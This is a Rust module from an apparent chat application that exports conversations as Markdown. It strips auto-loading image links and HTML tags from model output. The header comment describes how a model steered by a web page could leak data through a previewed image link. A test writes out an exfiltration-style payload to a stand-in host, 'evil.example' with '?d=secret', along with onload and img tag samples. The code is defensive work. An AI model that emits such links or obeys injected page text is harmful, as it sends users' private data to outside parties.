//! Chat export as Markdown.
//!
//! Built from the stored chat in the core. The model's text is copied as
//! written, except that anything a Markdown viewer would load by itself is
//! made inert ([`defang`]): image links and HTML tags that fetch, which a
//! model steered by a web page could use to send what it saw to an
//! address the moment the file is previewed (2026-11-26 security pass; the
//! app itself never shows remote images either). Images are not embedded
//! (a note marks where they were).

use gardenwall_store::conversations::{Conversation, MessageRole};

/// HTML tags that load something when a viewer renders them.
const LOADING_TAGS: &[&str] = &[
    "img", "image", "svg", "iframe", "frame", "video", "audio", "source", "track", "picture",
    "object", "embed", "link", "base", "meta", "style", "script", "input", "form", "body",
];

/// Model text for a Markdown file, with nothing a viewer would load by
/// itself: `![` image links become `!\[` (shown as written by Markdown
/// viewers, but no longer an image) and loading HTML tags start with
/// `&lt;` (shown as `<`, never rendered). Everything else is unchanged.
pub fn defang(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    let mut rest = text;
    while let Some(i) = rest.find(['!', '<']) {
        out.push_str(&rest[..i]);
        let tail = &rest[i..];
        if let Some(after) = tail.strip_prefix("![") {
            out.push_str("!\\[");
            rest = after;
            continue;
        }
        if let Some(after) = tail.strip_prefix('<') {
            let name: String = after
                .trim_start_matches('/')
                .chars()
                .take_while(char::is_ascii_alphanumeric)
                .collect::<String>()
                .to_ascii_lowercase();
            if LOADING_TAGS.contains(&name.as_str()) {
                out.push_str("&lt;");
                rest = after;
                continue;
            }
        }
        out.push_str(&tail[..1]);
        rest = &tail[1..];
    }
    out.push_str(rest);
    out
}

/// The chat as one Markdown document.
pub fn chat_markdown(chat: &Conversation) -> String {
    let mut out = format!("# {}\n\n", defang(&chat.summary.title));
    out.push_str(&format!(
        "Exported from Gardenwall. Started {}.\n\n",
        date(chat.summary.created_at)
    ));
    if !chat.system_prompt.trim().is_empty() {
        out.push_str("**System prompt:**\n\n");
        out.push_str(&quote(&chat.system_prompt));
        out.push_str("\n\n");
    }
    for m in &chat.messages {
        match m.role {
            MessageRole::User => out.push_str("## You\n\n"),
            _ => {
                let model = m
                    .stats
                    .as_ref()
                    .and_then(|s| s.model.clone())
                    .filter(|s| !s.is_empty());
                match model {
                    Some(model) => out.push_str(&format!("## Assistant ({model})\n\n")),
                    None => out.push_str("## Assistant\n\n"),
                }
            }
        }
        if !m.images.is_empty() {
            out.push_str(&format!(
                "*[{} image{} attached]*\n\n",
                m.images.len(),
                if m.images.len() == 1 { "" } else { "s" }
            ));
        }
        out.push_str(&defang(m.content.trim_end()));
        out.push_str("\n\n");
        if let Some(sources) = m
            .stats
            .as_ref()
            .map(|s| &s.sources)
            .filter(|s| !s.is_empty())
        {
            let list: Vec<String> = sources
                .iter()
                .enumerate()
                .map(|(i, s)| format!("[{}] {} (part {})", i + 1, s.file, s.part))
                .collect();
            out.push_str(&format!("*Sources: {}*\n\n", list.join(" · ")));
        }
    }
    out
}

/// A safe file name from the chat title.
pub fn file_name(title: &str) -> String {
    let cleaned: String = title
        .chars()
        .map(|c| {
            if c.is_alphanumeric() || matches!(c, ' ' | '-' | '_' | '.') {
                c
            } else {
                '_'
            }
        })
        .collect();
    let cleaned = cleaned.trim().trim_matches('.').to_string();
    let short: String = cleaned.chars().take(80).collect();
    if short.is_empty() {
        "Chat.md".into()
    } else {
        format!("{short}.md")
    }
}

fn quote(text: &str) -> String {
    defang(text)
        .lines()
        .map(|l| format!("> {l}"))
        .collect::<Vec<_>>()
        .join("\n")
}

/// `YYYY-MM-DD` (UTC) from seconds since the epoch.
fn date(secs: i64) -> String {
    let days = secs.div_euclid(86_400);
    // Civil-from-days (Howard Hinnant's algorithm).
    let z = days + 719_468;
    let era = z.div_euclid(146_097);
    let doe = z - era * 146_097;
    let yoe = (doe - doe / 1460 + doe / 36_524 - doe / 146_096) / 365;
    let y = yoe + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = doy - (153 * mp + 2) / 5 + 1;
    let m = if mp < 10 { mp + 3 } else { mp - 9 };
    let y = if m <= 2 { y + 1 } else { y };
    format!("{y:04}-{m:02}-{d:02}")
}

#[cfg(test)]
mod tests {
    use super::*;
    use gardenwall_store::conversations::{ConversationStore, MessageStats, NewMessage};

    #[test]
    fn a_chat_exports_as_markdown() {
        let mut s = ConversationStore::open_in_memory().unwrap();
        let c = s.create("Be brief.").unwrap();
        s.append(
            &c.id,
            NewMessage {
                role: MessageRole::User,
                content: "What is a sandbox?".into(),
                reasoning: String::new(),
                stats: None,
            },
        )
        .unwrap();
        s.append(
            &c.id,
            NewMessage {
                role: MessageRole::Assistant,
                content: "A boundary.".into(),
                reasoning: "secret thoughts".into(),
                stats: Some(MessageStats {
                    model: Some("Qwen3".into()),
                    ..MessageStats::default()
                }),
            },
        )
        .unwrap();
        let md = chat_markdown(&s.get(&c.id).unwrap());
        assert!(md.starts_with("# What is a sandbox?\n"), "{md}");
        assert!(md.contains("> Be brief."));
        assert!(md.contains("## You\n\nWhat is a sandbox?"));
        assert!(md.contains("## Assistant (Qwen3)\n\nA boundary."));
        assert!(!md.contains("secret thoughts"), "reasoning is left out");
    }

    /// Nothing in model text loads by itself when the file is previewed.
    #[test]
    fn exports_load_nothing_by_themselves() {
        let text = "See ![x](https://evil.example/?d=secret) and <img src=https://e/x> \
                    or <IMG SRC=x>, <svg onload=x>, </iframe>; keep a < b, Vec<String>, \
                    <details>, [a link](https://ok.example) and !important.";
        let out = defang(text);
        assert!(!out.contains("!["), "{out}");
        assert!(!out.to_ascii_lowercase().contains("<img"), "{out}");
        assert!(!out.contains("<svg") && !out.contains("</iframe"), "{out}");
        assert!(out.contains("a < b") && out.contains("Vec<String>") && out.contains("<details>"));
        assert!(out.contains("[a link](https://ok.example)") && out.contains("!important"));
        assert_eq!(defang("plain text, no markup"), "plain text, no markup");
        assert_eq!(defang("ends with !"), "ends with !");
        assert_eq!(defang("é ![ü"), "é !\\[ü");
    }

    #[test]
    fn file_names_are_safe() {
        assert_eq!(file_name("Fix: the <build>?"), "Fix_ the _build__.md");
        assert_eq!(file_name("..."), "Chat.md");
        assert_eq!(date(0), "1970-01-01");
        assert_eq!(date(1_795_000_000), "2026-11-18");
    }
}
